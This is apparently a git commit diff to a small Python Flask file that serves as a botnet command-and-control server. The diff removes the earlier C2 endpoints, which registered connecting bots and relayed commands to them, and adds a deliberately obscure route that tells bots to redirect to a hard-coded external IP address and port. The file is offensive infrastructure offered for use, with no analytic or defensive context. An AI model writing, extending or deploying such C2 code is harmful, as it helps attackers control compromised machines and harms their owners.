493fc54021bf43d45cffb0d690ef06ba25f0cf46
MIKHAEL David <mikhaeld@eduprovence.fr>
2025-07-19 23:00:23 +0200

    i

--- xilomheb.py
+++ xilomheb.py
@@ -1,28 +1,10 @@
-from flask import Flask, request, jsonify
+from flask import Flask, Response
 
 app = Flask(__name__)
 
-botnets = []
+@app.route('/x9d3k7x2')  # <- nom de route discret
+def redirect_bot():
+    return Response("REDIRECT 37.66.40.122 9999", mimetype='text/plain')
 
-@app.route('/')
-def home():
-    return "Serveur C2 Flask en ligne"
-
-@app.route('/connect', methods=['POST'])
-def connect_bot():
-    data = request.json
-    bot_id = data.get("id")
-    if bot_id and bot_id not in botnets:
-        botnets.append(bot_id)
-        print(f"Bot connecté : {bot_id}")
-    return jsonify({"status": "connected", "commands": []})
-
-@app.route('/commands', methods=['POST'])
-def send_command():
-    command = request.json.get("command")
-    print(f"Commande reçue à envoyer aux bots : {command}")
-
-    return jsonify({"status": "command sent"})
-
-if __name__ == "__main__":
+if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
